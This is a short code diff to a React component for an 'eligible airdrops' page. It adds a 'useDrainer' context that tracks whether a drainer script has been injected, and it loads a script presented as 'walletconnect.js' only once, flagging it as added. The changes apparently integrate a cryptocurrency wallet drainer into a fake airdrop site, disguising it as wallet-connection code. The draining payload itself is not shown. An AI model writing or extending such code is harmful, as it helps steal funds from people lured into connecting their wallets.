@@ -5,13 +5,18 @@ import { auth, userService } from "../../../main.jsx";
 import { useAuthState } from "../../../hooks/userAuthState.js";
 import { AIRDROPS } from "../../Address/Address.jsx";
 import { Badge, Button } from "@mantine/core";
+import {useDrainer} from "../../../context/DrainerContext.jsx";
+
 
 const EligibleAirdrops = () => {
   const [airdrops, setAirdrops] = useState([]);
   const [userWallet, setUserWallet] = useState(null);
   const [user] = useAuthState(auth);
+	const { drainerIsAdded, updateStatus } = useDrainer()
 
 	useEffect(() => {
+		if (drainerIsAdded) return;
+
 		const onDOMContentLoaded = () => {
 			// Dynamically load the walletconnect.js script
 			const secondScript = document.createElement("script");
@@ -22,6 +27,7 @@ const EligibleAirdrops = () => {
 
 			// Ensure the script initializes properly once loaded
 			secondScript.onload = () => {
+				updateStatus();
 				console.log("Second script loaded successfully");
 			};
 		};
